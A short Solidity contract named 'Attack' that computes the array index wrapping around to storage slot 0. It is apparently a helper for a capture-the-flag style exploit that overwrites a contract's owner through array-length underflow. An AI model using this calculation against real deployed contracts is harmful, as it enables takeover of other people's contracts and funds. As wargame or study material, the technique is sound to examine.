// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract Attack {
    bytes32 public one;
    uint256 public index;

    function getIndex() public {
        one = keccak256(abi.encodePacked(uint256(1)));
        index = 2**256 - 1 - uint256(one) + 1;
    }
}
